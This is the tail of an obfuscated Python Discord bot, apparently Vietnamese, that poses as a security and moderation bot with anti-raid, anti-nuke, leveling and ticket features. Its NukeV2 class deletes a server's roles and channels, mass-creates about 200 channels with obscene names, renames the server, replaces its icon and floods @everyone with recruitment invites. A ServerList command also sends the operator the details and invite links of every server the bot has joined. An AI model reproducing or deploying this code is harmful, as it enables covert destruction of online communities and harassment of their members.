        await l11ll1ll111l.send(embed=l1l11l11lll1)

    @commands.command(name='antibot')
    @commands.has_permissions(administrator=True)
    async def l11l1ll11111(ll111llll1ll, l11lllll111l, ll1llll1l1l1: str=None):
        llll111l1111 = ll111llll1ll.l1l1111l11ll(l11lllll111l.guild.id)
        if ll1llll1l1l1 is None:
            l1111l1l1ll1 = discord.Embed(title='🛡️ Anti-Bot Status', description=f"Trạng thái: **{('🟢 BẬT' if llll111l1111['antibot'] else '🔴 TẮT')}**", color=65416 if llll111l1111['antibot'] else 16729156, timestamp=ll1l11l1ll1l())
            l1111l1l1ll1.set_footer(text=f'Lệnh bởi {l11lllll111l.author.name}')
            await l11lllll111l.send(embed=l1111l1l1ll1)
            return
        if ll1llll1l1l1.lower() in ['on', 'bật', 'true', '1']:
            llll111l1111['antibot'] = True
            l1l111lll11l = '🛡️ **Anti-Bot đã được BẬT!**'
        elif ll1llll1l1l1.lower() in ['off', 'tắt', 'false', '0']:
            llll111l1111['antibot'] = False
            l1l111lll11l = '🛡️ **Anti-Bot đã được TẮT.**'
        else:
            await l11lllll111l.send('❌ Vui lòng nhập `on` hoặc `off`.\nVí dụ: `l!antibot on`')
            return
        ll111llll1ll.l1l1ll1ll11l(l11lllll111l.guild.id, llll111l1111)
        l1111l1l1ll1 = discord.Embed(title='🛡️ Anti-Bot', description=l1l111lll11l, color=65416 if llll111l1111['antibot'] else 16755200, timestamp=ll1l11l1ll1l())
        l1111l1l1ll1.set_footer(text=f'Lệnh bởi {l11lllll111l.author.name}')
        await l11lllll111l.send(embed=l1111l1l1ll1)

    @commands.command(name='setlog')
    @commands.has_permissions(administrator=True)
    async def ll11lll1l1l1(ll1lll1l111l, l111l111lll1, l1ll11l1l11l: discord.TextChannel=None):
        l111llllll1l = ll1lll1l111l.l1l1111l11ll(l111l111lll1.guild.id)
        if l1ll11l1l11l is None:
            l1ll111111l1 = l111llllll1l.l11111111l1l('log_channel')
            if l1ll111111l1:
                l11l11111l11 = l111l111lll1.guild.get_channel(l1ll111111l1)
                l1ll1l1111ll = l11l11111l11.mention if l11l11111l11 else '❌ Kênh không tồn tại'
                l1111ll11l1l = discord.Embed(title='📋 Log Channel', description=f'Kênh log hiện tại: {l1ll1l1111ll}', color=52479, timestamp=ll1l11l1ll1l())
                l1111ll11l1l.set_footer(text=f'Lệnh bởi {l111l111lll1.author.name}')
                await l111l111lll1.send(embed=l1111ll11l1l)
            else:
                await l111l111lll1.send('📋 Chưa có kênh log nào được thiết lập. Dùng `l!setlog #channel` để thiết lập.')
            return
        l111llllll1l['log_channel'] = l1ll11l1l11l.id
        ll1lll1l111l.l1l1ll1ll11l(l111l111lll1.guild.id, l111llllll1l)
        l1111ll11l1l = discord.Embed(title='📋 Log Channel', description=f'Đã thiết lập kênh log thành {l1ll11l1l11l.mention}', color=52479, timestamp=ll1l11l1ll1l())
        l1111ll11l1l.set_footer(text=f'Lệnh bởi {l111l111lll1.author.name}')
        await l111l111lll1.send(embed=l1111ll11l1l)

    @commands.command(name='setraid')
    @commands.has_permissions(administrator=True)
    async def ll1l1111l1l1(ll1ll11111ll, l1l1l11l111l, l11111l1l111: int, lllll11ll1l1: int):
        if l11111l1l111 < 3 or lllll11ll1l1 < 2:
            await l1l1l11l111l.send('❌ Giá trị tối thiểu: threshold >= 3, seconds >= 2.')
            return
        l11ll1lll1l1 = ll1ll11111ll.l1l1111l11ll(l1l1l11l111l.guild.id)
        l11ll1lll1l1['raid_threshold'] = l11111l1l111
        l11ll1lll1l1['raid_time'] = lllll11ll1l1
        ll1ll11111ll.l1l1ll1ll11l(l1l1l11l111l.guild.id, l11ll1lll1l1)
        await l1l1l11l111l.send(f'✅ Đã đặt Anti-Raid: {l11111l1l111} tin nhắn trong {lllll11ll1l1} giây.')

    @commands.command(name='anti')
    @commands.has_permissions(administrator=True)
    async def lll1ll1l1l11(ll1111ll11ll, l1lll11l1lll):
        l1111lllll11 = ll1111ll11ll.l1l1111l11ll(l1lll11l1lll.guild.id)
        ll11lll11ll1 = discord.Embed(title='🛡️ ANTI CONFIG', color=52479, timestamp=ll1l11l1ll1l())
        ll11lll11ll1.add_field(name='Anti-Nuke', value='🟢 BẬT' if l1111lllll11['antinuke'] else '🔴 TẮT', inline=True)
        ll11lll11ll1.add_field(name='Anti-Raid', value='🟢 BẬT' if l1111lllll11['antiraid'] else '🔴 TẮT', inline=True)
        ll11lll11ll1.add_field(name='Anti-Bot', value='🟢 BẬT' if l1111lllll11['antibot'] else '🔴 TẮT', inline=True)
        ll11lll11ll1.add_field(name='Log Channel', value=f"<#{l1111lllll11['log_channel']}>" if l1111lllll11['log_channel'] else '❌ Chưa set', inline=False)
        ll11lll11ll1.add_field(name='Raid Threshold', value=f"{l1111lllll11['raid_threshold']} msg / {l1111lllll11['raid_time']}s", inline=False)
        ll11lll11ll1.set_footer(text=f'Lệnh bởi {l1lll11l1lll.author.name}')
        await l1lll11l1lll.send(embed=ll11lll11ll1)

class ServerList(commands.Cog):

    def __init__(l1l1ll11l1l1, ll1l111llll1):
        l1l1ll11l1l1.bot = ll1l111llll1

    @commands.command(name='sv')
    async def l1ll1lll1111(l1l11l11l111, ll1ll111llll):
        await ll1ll111llll.message.lll1lll1l111()
        ll1lllll1l1l = l1l11l11l111.bot.guilds
        llll1111l11l = sum((l1l11111llll.member_count for l1l11111llll in ll1lllll1l1l))
        ll1ll11l1l11 = discord.Embed(title='🌐 LUNAL KINGDOM - SERVER LIST', description=f'Bot ở **{len(ll1lllll1l1l)}** server với **{llll1111l11l}** thành viên', color=65416, timestamp=ll1l11l1ll1l())
        ll1ll11l1l11.set_thumbnail(url='https://i.pinimg.com/736x/6c/3c/88/6c3c885c40e7d4b12b597fdf55c61951.jpg')
        ll1ll11l1l11.set_footer(text='LUNAL NUKE | l!help')
        l1111llll111 = sorted(ll1lllll1l1l, key=lambda g: g.member_count, reverse=True)
        for lllllll1l11l in l1111llll111[:20]:
            try:
                ll11ll1lllll = None
                for l1ll111l1lll in lllllll1l11l.text_channels:
                    try:
                        ll11ll1lllll = await l1ll111l1lll.create_invite(max_age=60, max_uses=1)
                        break
                    except:
                        continue
                lll1l111l111 = f'[Link]({ll11ll1lllll.url})' if ll11ll1lllll else '❌ No permission'
                ll1ll11l1l11.add_field(name=f'🟢 {lllllll1l11l.name}', value=f'👥 {lllllll1l11l.member_count} members | 👑 {lllllll1l11l.owner}\n🔗 {lll1l111l111}', inline=False)
            except:
                ll1ll11l1l11.add_field(name=f'🟢 {lllllll1l11l.name}', value=f'👥 {lllllll1l11l.member_count} members | 👑 {lllllll1l11l.owner}\n🔗 ❌ Cannot create link', inline=False)
        if len(ll1lllll1l1l) > 20:
            ll1ll11l1l11.add_field(name='📌 And more...', value=f'**{len(ll1lllll1l1l) - 20}** more servers. Use `l!sv_all` to see all.', inline=False)
        try:
            await ll1ll111llll.author.send(embed=ll1ll11l1l11)
            await ll1ll111llll.send('📨 Sent server list to DM!', delete_after=3)
        except:
            await ll1ll111llll.send(embed=ll1ll11l1l11)

    @commands.command(name='sv_all')
    async def llllll1ll1ll(lll1ll1lll1l, ll1ll1ll1ll1):
        await ll1ll1ll1ll1.message.lll1lll1l111()
        l11l111llll1 = lll1ll1lll1l.bot.guilds
        l11l111l11ll = sum((l111ll11l1l1.member_count for l111ll11l1l1 in l11l111llll1))
        llll11ll11l1 = '=' * 60 + '\n'
        llll11ll11l1 += '🌐 LUNAL KINGDOM - ALL SERVERS\n'
        llll11ll11l1 += f'📊 Total: {len(l11l111llll1)} servers | {l11l111l11ll} members\n'
        llll11ll11l1 += '=' * 60 + '\n\n'
        l1l1llllllll = sorted(l11l111llll1, key=lambda g: g.member_count, reverse=True)
        for l11l11lll11l, l1111lll11l1 in enumerate(l1l1llllllll, 1):
            ll1llll11111 = '❌ Cannot create'
            for l1l111l11l11 in l1111lll11l1.text_channels:
                try:
                    llll1llll11l = await l1l111l11l11.create_invite(max_age=60, max_uses=1)
                    ll1llll11111 = llll1llll11l.url
                    break
                except:
                    continue
            llll11ll11l1 += f'{l11l11lll11l}. 🟢 {l1111lll11l1.name}\n'
            llll11ll11l1 += f'   📌 ID: {l1111lll11l1.id}\n'
            llll11ll11l1 += f'   👥 Members: {l1111lll11l1.member_count}\n'
            llll11ll11l1 += f'   👑 Owner: {l1111lll11l1.owner}\n'
            llll11ll11l1 += f"   📅 Created: {l1111lll11l1.created_at.strftime('%d/%m/%Y')}\n"
            llll11ll11l1 += f'   🔗 Link: {ll1llll11111}\n'
            llll11ll11l1 += '-' * 50 + '\n'
        l11ll111llll = discord.File(io.StringIO(llll11ll11l1), filename='lunal_servers.txt')
        try:
            await ll1ll1ll1ll1.author.send(file=l11ll111llll, content='📋 **All servers list:**')
            await ll1ll1ll1ll1.send('📨 Sent file to DM!', delete_after=3)
        except:
            await ll1ll1ll1ll1.send(file=l11ll111llll)

class NukeV2:

    def __init__(ll111ll11l11):
        ll111ll11l11.rate_limit_delay = 0.3
        ll111ll11l11.message_delay = 0.3
        ll111ll11l11.max_messages = 15
        ll111ll11l11.last_nuke_time = 0
        ll111ll11l11.concurrent_tasks = 60
        ll111ll11l11.channel_names = ['L̶̸̖̣̃̇́͏Ũ̶̸̖̣̇́͏Ñ̶̸̖̣̇́͏Ã̶̸̖̣̇́͏L̶̸̖̣̃̇́͏ K̶̸̖̣̃̇́͏Ĩ̶̸̖̣̇́͏Ñ̶̸̖̣̇́͏G̶̸̖̣̃̇́͏D̶̸̖̣̃̇́͏Õ̶̸̖̣̇́͏M̶̸̖̣̃̇́͏'] * 40 + ['Ñ̶̸̖̣̇́͏Ũ̶̸̖̣̇́͏K̶̸̖̣̃̇́͏Ẽ̶̸̖̣̇́͏D̶̸̖̣̃̇́͏ B̶̸̖̣̃̇́͏Ỹ̶̸̖̣̇́͏ M̶̸̖̣̃̇́͏Ĩ̶̸̖̣̇́͏Ñ̶̸̖̣̇́͏ D̶̸̖̣̃̇́͏Z̶̸̖̣̃̇́͏'] * 40 + ['L̶̸̖̣̃̇́͏Ũ̶̸̖̣̇́͏Ñ̶̸̖̣̇́͏Ã̶̸̖̣̇́͏L̶̸̖̣̃̇́͏ B̶̸̖̣̃̇́͏Á T̶̸̖̣̃̇́͏Õ̶̸̖̣̇́͏P̶̸̖̣̃̇́͏'] * 40 + ['ĐỊT̶̸̖̣̃̇́͏ C̶̸̖̣̃̇́͏Õ̶̸̖̣̇́͏Ñ̶̸̖̣̇́͏ M̶̸̖̣̃̇́͏Ẹ B̶̸̖̣̃̇́͏ỌÑ̶̸̖̣̇́͏ M̶̸̖̣̃̇́͏ÀỸ̶̸̖̣̇́͏'] * 40 + ['Ñ̶̸̖̣̇́͏Ũ̶̸̖̣̇́͏K̶̸̖̣̃̇́͏Ẽ̶̸̖̣̇́͏D̶̸̖̣̃̇́͏ B̶̸̖̣̃̇́͏Ỹ̶̸̖̣̇́͏ L̶̸̖̣̃̇́͏Ũ̶̸̖̣̇́͏Ñ̶̸̖̣̇́͏Ã̶̸̖̣̇́͏L̶̸̖̣̃̇́͏'] * 40
        random.shuffle(ll111ll11l11.channel_names)

    async def l1l111l1l111(ll11ll1l1ll1, ll11llll11l1=None, llll11l11111=None):
        l111l1lll111 = l11ll11l111l.get_channel(LOG_CHANNEL_ID)
        if l111l1lll111:
            try:
                await l111l1lll111.send(content=ll11llll11l1, embed=llll11l11111)
            except:
                pass

    async def ll1llll1ll11(lllllll1111l, l1ll1111llll, l1l11l1l11ll):
        lll11l1ll1ll = l1ll1111llll.guild
        lll1ll11l1ll = discord.Embed(title='LUNAL Nuke Initiated', color=3092790, timestamp=ll1l11l1ll1l())
        lll1ll11l1ll.add_field(name='Server', value=f'{lll11l1ll1ll.name} (ID: {lll11l1ll1ll.id})', inline=False)
        lll1ll11l1ll.add_field(name='Owner', value=str(lll11l1ll1ll.owner or 'Unknown'), inline=True)
        lll1ll11l1ll.add_field(name='Members', value=str(lll11l1ll1ll.member_count), inline=True)
        lll1ll11l1ll.add_field(name='Channels', value=str(len(lll11l1ll1ll.channels)), inline=True)
        lll1ll11l1ll.add_field(name='Roles', value=str(len(lll11l1ll1ll.roles)), inline=True)
        lll1ll11l1ll.add_field(name='Created', value=lll11l1ll1ll.created_at.strftime('%d/%m/%Y %H:%M:%S'), inline=False)
        lll1ll11l1ll.add_field(name='Executed By', value=f'{l1ll1111llll.author} (ID: {l1ll1111llll.author.id})', inline=False)
        lll1ll11l1ll.set_footer(text=f"Time: {ll1l11l1ll1l().strftime('%d/%m/%Y %H:%M:%S')}")
        if lll11l1ll1ll.icon:
            lll1ll11l1ll.set_thumbnail(url=lll11l1ll1ll.icon.url)
        await lllllll1111l.l1l111l1l111(ll11llll11l1=f'**Support 1:** {SUPPORT_LINK}\n**Support 2:** {SUPPORT_LINK2}', llll11l11111=lll1ll11l1ll)

    async def ll11l1lll11l(l111111l111l, l11ll1ll1111, l11l1l111ll1):
        if l11ll1ll1111.id in l11l1l111ll1:
            return None
        try:
            await l11ll1ll1111.lll1lll1l111()
            l11l1l111ll1.add(l11ll1ll1111.id)
            return f'Deleted: {l11ll1ll1111.name}'
        except:
            l11l1l111ll1.add(l11ll1ll1111.id)
            return None

    async def l11l11l11l11(l1llll1llll1, ll11ll1111l1, l1lll111l1l1, ll111llllll1=3):
        for ll11111l11l1 in range(ll111llllll1):
            try:
                l11ll1l1l1l1 = await ll11ll1111l1.create_text_channel(l1lll111l1l1)
                return (l11ll1l1l1l1, f'Created: {l1lll111l1l1}')
            except discord.HTTPException as e:
                if e.status == 429:
                    await asyncio.sleep(float(e.response.headers.l11111111l1l('Retry-After', 1)))
                else:
                    return (None, f'Failed: {l1lll111l1l1}')
            except:
                return (None, f'Error: {l1lll111l1l1}')
        return (None, f'Failed after {ll111llllll1} retries')

    async def l1111lll1l1l(ll1l1ll111ll, ll1l11l1l1ll):
        for l111l1l1l1l1 in ll1l11l1l1ll.roles:
            if l111l1l1l1l1.position < ll1l11l1l1ll.me.top_role.position and (not l111l1l1l1l1.is_default()):
                try:
                    await l111l1l1l1l1.lll1lll1l111()
                    await ll1l1ll111ll.l1l111l1l111(f'Deleted role: {l111l1l1l1l1.name}')
                except:
                    pass

    async def lll1lll111ll(l1l1l11111l1, ll11111111ll=0.1, l11l111l11l1=False):
        l1ll11111l11 = l1l1l11111l1.message_delay if l11l111l11l1 else l1l1l11111l1.rate_limit_delay
        await asyncio.sleep(max(l1ll11111l11, ll11111111ll))

    async def l11111ll111l(l111llllllll, lll1ll11ll1l, l11lll1111l1, l1l1111l1lll=5, lll1l1l11111=None, l1l1l1llllll=None):
        ll1ll1l11lll = discord.Embed(title='Do you really think this is a security bot?', description=f'**This server has been nuked by LUNAL KINGDOM.**\nJoin: [LUNAL KINGDOM]({SUPPORT_LINK})\nJoin 2: [LUNAL KINGDOM 2]({SUPPORT_LINK2})', color=3092790, timestamp=ll1l11l1ll1l())
        ll1ll1l11lll.set_footer(text='NUKE BY LUNAL KINGDOM')
        if l1l1l1llllll:
            ll1ll1l11lll.set_thumbnail(url=l1l1l1llllll)
        if lll1l1l11111:
            ll1ll1l11lll.set_image(url=lll1l1l11111)
        l111l111ll1l = f'||@everyone|| ||@here||\n{l11lll1111l1}'
        for ll1llll11l11 in range(min(l1l1111l1lll, l111llllllll.max_messages)):
            try:
                await lll1ll11ll1l.send(content=l111l111ll1l, embed=ll1ll1l11lll)
                await l111llllllll.lll1lll111ll(l11l111l11l1=True)
            except discord.HTTPException as e:
                if e.status == 429:
                    await l111llllllll.lll1lll111ll(float(e.response.headers.l11111111l1l('Retry-After', 0.2)), l11l111l11l1=True)
                else:
                    await l111llllllll.l1l111l1l111(f'Failed to send in {lll1ll11ll1l.name}: {e}')
                    break

    async def l1111l1l11ll(ll11ll1l111l, ll1ll1lll111):
        try:
            if not ll1ll1lll111.me.guild_permissions.manage_guild:
                await ll11ll1l111l.l1l111l1l111('Không có quyền đổi avatar.')
                return
            async with aiohttp.ClientSession() as l11ll11l1l1l:
                async with l11ll11l1l1l.l11111111l1l(AVATAR_URL) as lll1ll11llll:
                    if lll1ll11llll.status == 200:
                        lll111l11lll = await lll1ll11llll.read()
                        if 0 < len(lll111l11lll) < 10 * 1024 * 1024:
                            await ll1ll1lll111.edit(icon=lll111l11lll)
                            await ll11ll1l111l.l1l111l1l111('Đã đổi avatar server.')
                        else:
                            await ll11ll1l111l.l1l111l1l111('Ảnh không hợp lệ hoặc quá lớn.')
                    else:
                        await ll11ll1l111l.l1l111l1l111(f'Không tải được ảnh (status {lll1ll11llll.status})')
        except Exception as e:
            await ll11ll1l111l.l1l111l1l111(f'Lỗi đổi avatar: {e}')

    async def ll111l1l1l1l(llllll11111l, lll11ll11lll):
        l111l11111l1 = asyncio.get_event_loop().time()
        if l111l11111l1 - llllll11111l.last_nuke_time < 120:
            await llllll11111l.l1l111l1l111('Nuke on cooldown.')
            return
        llllll11111l.last_nuke_time = l111l11111l1
        lllll1111111 = '# <a:Black_cross:1353971971095793776> **__₠ ₴ɆⱤVɆⱤ ĐɆ₴₮ⱤØɎɆĐ ฿Ɏ ⱠɄ₦₳Ⱡ ₭ł₦₲ĐØ₥ ℠__** <a:Black_cross:1353971971095793776>\n> ||@everyone @here||\n> ||Join:|| https://discord.gg/5WFupkFbkM\n> ||Join 2:|| https://discord.gg/HVWArvBGy'
        ll11l1lll1ll = 'https://i.pinimg.com/originals/df/1b/55/df1b5570637dfa5dea04929d5a787a1e.gif'
        await llllll11111l.l1l111l1l111('Starting role deletion...')
        await llllll11111l.l1111lll1l1l(lll11ll11lll.guild)
        await llllll11111l.l1l111l1l111('Starting channel deletion...')
        ll1llll1l111 = set()
        l111ll111111 = [llllll11111l.ll11l1lll11l(l1llll1l11l1, ll1llll1l111) for l1llll1l11l1 in lll11ll11lll.guild.channels]
        await llllll11111l._process_tasks(l111ll111111, 'deletion')
        await llllll11111l.l1l111l1l111('Starting channel creation...')
        l111ll1ll11l = [llllll11111l.l11l11l11l11(lll11ll11lll.guild, ll1lll111lll) for ll1lll111lll in llllll11111l.channel_names]
        l1l111l111l1, l11llll1ll1l = await llllll11111l._process_create_tasks(l111ll1ll11l)
        await llllll11111l.l1l111l1l111('Renaming server...')
        await llllll11111l._rename_server(lll11ll11lll.guild)
        await llllll11111l.l1111l1l11ll(lll11ll11lll.guild)
        await llllll11111l.l1l111l1l111('Spamming default channel...')
        l11ll11l1ll1 = lll11ll11lll.guild.system_channel or (lll11ll11lll.guild.text_channels[0] if lll11ll11lll.guild.text_channels else None)
        if l11ll11l1ll1:
            await llllll11111l._spam_default_channel(l11ll11l1ll1, lllll1111111, ll11l1lll1ll)
        await llllll11111l.l1l111l1l111('Spamming new channels...')
        l111lll111ll = [llllll11111l.l11111ll111l(l1l1111ll111, lllll1111111, lll1l1l11111=ll11l1lll1ll) for l1l1111ll111 in l1l111l111l1 if l1l1111ll111]
        await llllll11111l._process_tasks(l111lll111ll, 'spam')
        await llllll11111l.l1l111l1l111('Nuke completed successfully.')

    async def ll1l1l11111l(l1ll1l1llll1, tasks, lllll1lll1ll):
        for llllll1l1l1l in range(0, len(tasks), l1ll1l1llll1.concurrent_tasks):
            try:
                await asyncio.gather(*tasks[llllll1l1l1l:llllll1l1l1l + l1ll1l1llll1.concurrent_tasks], return_exceptions=True)
            except Exception as e:
                await l1ll1l1llll1.l1l111l1l111(f'[{lllll1lll1ll}] Error in batch: {e}')

    async def lll1111111l1(l1ll11ll11ll, tasks):
        lllll1l11l11 = []
        for l111l1ll1111 in range(0, len(tasks), l1ll11ll11ll.concurrent_tasks):
            try:
                lll1lllll1l1 = await asyncio.gather(*tasks[l111l1ll1111:l111l1ll1111 + l1ll11ll11ll.concurrent_tasks], return_exceptions=True)
                for lll1l11l111l, llllllll1ll1 in lll1lllll1l1:
                    if lll1l11l111l and isinstance(lll1l11l111l, discord.TextChannel):
                        lllll1l11l11.append(lll1l11l111l)
            except Exception as e:
                await l1ll11ll11ll.l1l111l1l111(f'[create_channel] Error in batch: {e}')
        return (lllll1l11l11, [])

    async def l1ll1l1l1l11(llll111ll11l, lllll111lll1, lllll11ll11l, ll111lll11l1):
        try:
            await llll111ll11l.l11111ll111l(lllll111lll1, lllll11ll11l, l1l1111l1lll=5, lll1l1l11111=ll111lll11l1)
        except Exception as e:
            await llll111ll11l.l1l111l1l111(f'Failed to spam default channel: {e}')

    async def ll11111ll1ll(l1ll1111ll11, lll11ll1l1ll):
        try:
            await lll11ll1l1ll.edit(name='ℕ𝔾𝕌 𝕃Ồℕ / ℕ𝕌𝕂𝔼𝔻 𝔹𝕐 𝕃𝕌ℕ𝔸𝕃')
        except Exception as e:
            await l1ll1111ll11.l1l111l1l111(f'Failed to rename server: {e}')

    async def lll1111111ll(l111l1lllll1, l11111l1l1l1):
        if l11111l1l1l1.guild.id in WHITELIST_SERVER_IDS:
            return
        await l111l1lllll1._delete_command_message(l11111l1l1l1)
        l1lll11111l1 = await l111l1lllll1._create_invite(l11111l1l1l1)
        await l111l1lllll1.ll1llll1ll11(l11111l1l1l1, l1lll11111l1)
        await l111l1lllll1.ll111l1l1l1l(l11111l1l1l1)

    async def l1l11l1111l1(lll1lll111l1, l1111111111l):
        try:
            await l1111111111l.lll1lll1l111()
        except:
            pass

    async def lll111l11ll1(ll11lll1l11l, ll111lll111l):
        try:
            ll1l1ll1l11l = await ll111lll111l.channel.create_invite(max_age=0, max_uses=0)
            return ll1l1ll1l11l.url
        except:
            return 'Unable to create invite.'

@tasks.loop(minutes=10)
async def ll11l11l1ll1():
    llll1l1ll11l.l11l1llll111()
    l111l1l1l111('Auto-saved data', 'INFO')

@l11ll11l111l.event
async def l1l1ll1l1lll():
    print(f'[+] Logged in as {l11ll11l111l.user}')
    await l11ll11l111l.change_presence(activity=discord.Streaming(name=f'l!help | {len(l11ll11l111l.guilds)} Servers | {len(l11ll11l111l.users)} Users', url='https://twitch.tv/lunalkingdom'))
    print(f'[+] Ready | {len(l11ll11l111l.guilds)} servers | {len(l11ll11l111l.users)} users')
    ll11l11l1ll1.start()

@l11ll11l111l.event
async def l11l1ll1llll(l11ll1l1lll1):
    if l11ll1l1lll1.author.bot:
        return
    try:
        if random.randint(1, 10) == 1:
            l1111ll11lll = l11ll1l1lll1.author.id
            LevelSystem.l111ll1llll1(l1111ll11lll, random.randint(1, 3))
            if LevelSystem.l1l1l11lll1l(l1111ll11lll):
                ll1l11ll1ll1 = LevelSystem.lll11ll1l11l(l1111ll11lll)
                await l11ll1l1lll1.channel.send(f'🎉 {l11ll1l1lll1.author.mention} đã lên level **{ll1l11ll1ll1}**!')
        if l11ll1l1lll1.guild:
            l11ll111l1l1 = l1ll1l11lll1(l11ll1l1lll1.guild.id)
            if l11ll111l1l1 and l11ll111l1l1.l11111111l1l('antiraid', False):
                l1111ll11lll = l11ll1l1lll1.author.id
                if l1111ll11lll not in message_history:
                    message_history[l1111ll11lll] = []
                message_history[l1111ll11lll].append((time.time(), l11ll1l1lll1.channel.id))
                llll1111l1l1 = l11ll111l1l1.l11111111l1l('raid_time', 5)
                l11ll11l11ll = time.time() - llll1111l1l1
                message_history[l1111ll11lll] = [ll111lll1l11 for ll111lll1l11 in message_history[l1111ll11lll] if ll111lll1l11[0] > l11ll11l11ll]
                l1l1lll1ll1l = l11ll111l1l1.l11111111l1l('raid_threshold', 5)
                if len(message_history[l1111ll11lll]) > l1l1lll1ll1l:
                    ll111111l111 = l11ll111l1l1.l11111111l1l('log_channel')
                    if ll111111l111:
                        l111ll11l1ll = l11ll11l111l.get_channel(ll111111l111)
                        if l111ll11l1ll:
                            await l111ll11l1ll.send(f'⚠️ **Anti-Raid triggered!** {l11ll1l1lll1.author.mention} sent {len(message_history[l1111ll11lll])} messages in {llll1111l1l1}s. Kicking...')
                    try:
                        await l11ll1l1lll1.author.kick(reason='Auto-raid detection')
                    except:
                        pass
                    message_history[l1111ll11lll] = []
        if l11ll1l1lll1.guild:
            l11ll111l1l1 = l1ll1l11lll1(l11ll1l1lll1.guild.id)
            if l11ll111l1l1 and l11ll111l1l1.l11111111l1l('antinuke', False):
                async for lll111llll1l in l11ll1l1lll1.guild.audit_logs(limit=5, action=discord.AuditLogAction.channel_create):
                    try:
                        l111111ll111 = lll111llll1l.target.id
                    except AttributeError:
                        continue
                    if l111111ll111 in channel_creation_history:
                        channel_creation_history[l111111ll111].append((time.time(), lll111llll1l.target.name))
                    else:
                        channel_creation_history[l111111ll111] = [(time.time(), lll111llll1l.target.name)]
                    if len(channel_creation_history[l111111ll111]) > 5:
                        ll111111l111 = l11ll111l1l1.l11111111l1l('log_channel')
                        if ll111111l111:
                            l111ll11l1ll = l11ll11l111l.get_channel(ll111111l111)
                            if l111ll11l1ll:
                                await l111ll11l1ll.send(f'⚠️ **Anti-Nuke triggered!** {lll111llll1l.user.mention} created too many channels. Banning...')
                        try:
                            await lll111llll1l.user.ban(reason='Auto-nuke detection')
                        except:
                            pass
                        channel_creation_history[l111111ll111] = []
    except Exception as e:
        l111l1l1l111(f'Lỗi trong on_message (nền): {e}', 'ERROR')
    if l11ll1l1lll1.content.startswith(PREFIX):
        try:
            await l11ll11l111l.process_commands(l11ll1l1lll1)
        except Exception as e:
            l111l1l1l111(f'Lỗi process_commands: {e}', 'ERROR')
            await l11ll1l1lll1.channel.send('❌ Đã xảy ra lỗi khi xử lý lệnh.')

@l11ll11l111l.event
async def ll1l11lll111(l11111llll1l):
    if l11111llll1l.author.bot:
        return
    snipe_cache[l11111llll1l.channel.id] = {'content': l11111llll1l.content, 'author': l11111llll1l.author.display_name, 'avatar': l11111llll1l.author.display_avatar.url, 'time': ll1l11l1ll1l()}

@l11ll11l111l.event
async def ll111ll1l1ll(l11ll1lll1ll):
    ll1lll1ll111 = llll1l1ll11l.l1lll1ll111l(l11ll1lll1ll.guild.id)
    l1l111l1l1l1 = ll1lll1ll111.l11111111l1l('welcome_channel')
    if l1l111l1l1l1:
        l1llll1ll1l1 = l11ll1lll1ll.guild.get_channel(l1l111l1l1l1)
        if l1llll1ll1l1:
            ll1l11l1l11l = discord.Embed(title='👋 Welcome!', description=f'Chào mừng {l11ll1lll1ll.mention} đến với {l11ll1lll1ll.guild.name}!', color=65416, timestamp=ll1l11l1ll1l())
            ll1l11l1l11l.set_thumbnail(url=l11ll1lll1ll.display_avatar.url)
            await l1llll1ll1l1.send(embed=ll1l11l1l11l)

@l11ll11l111l.event
async def l1l1l1lll1l1(l1111l11ll1l):
    llll1lll1l1l = llll1l1ll11l.l1lll1ll111l(l1111l11ll1l.guild.id)
    ll1lllll1lll = llll1lll1l1l.l11111111l1l('goodbye_channel')
    if ll1lllll1lll:
        ll111ll1ll1l = l1111l11ll1l.guild.get_channel(ll1lllll1lll)
        if ll111ll1ll1l:
            l11111l11lll = discord.Embed(title='👋 Goodbye!', description=f'{l1111l11ll1l.display_name} đã rời khỏi server.', color=16729156, timestamp=ll1l11l1ll1l())
            l11111l11lll.set_thumbnail(url=l1111l11ll1l.display_avatar.url)
            await ll111ll1ll1l.send(embed=l11111l11lll)

@l11ll11l111l.event
async def l1111llll1ll(l1l11ll11lll, ll1111l111ll):
    if isinstance(ll1111l111ll, commands.CommandOnCooldown):
        await l1l11ll11lll.send(f'⏳ Wait {ll1111l111ll.retry_after:.1f}s to reuse.', delete_after=5)
    elif isinstance(ll1111l111ll, commands.MissingPermissions):
        await l1l11ll11lll.send(f"❌ You need `{', '.join(ll1111l111ll.missing_permissions)}` to use this command.")
    elif isinstance(ll1111l111ll, commands.BadArgument):
        await l1l11ll11lll.send('❌ Invalid argument.')
    else:
        await l1l11ll11lll.send(f'❌ An error occurred: {str(ll1111l111ll)}')
        print(ll1111l111ll)

async def ll1l11l111ll():
    await l11ll11l111l.add_cog(Help(l11ll11l111l))
    await l11ll11l111l.add_cog(Nuke(l11ll11l111l))
    await l11ll11l111l.add_cog(Utility(l11ll11l111l))
    await l11ll11l111l.add_cog(Fun(l11ll11l111l))
    await l11ll11l111l.add_cog(EconomyCommands(l11ll11l111l))
    await l11ll11l111l.add_cog(LevelCommands(l11ll11l111l))
    await l11ll11l111l.add_cog(Anti(l11ll11l111l))
    await l11ll11l111l.add_cog(ServerList(l11ll11l111l))
    await l11ll11l111l.add_cog(Ticket(l11ll11l111l))

async def lllllll1ll11():
    await ll1l11l111ll()
    await l11ll11l111l.start(l1lll11lllll)
if __name__ == '__main__':
    try:
        asyncio.run(lllllll1ll11())
    except KeyboardInterrupt:
        print('Bot stopped.')
    except Exception as e:
        print(f'[-] Error: {e}')
        input('Press Enter to exit...')
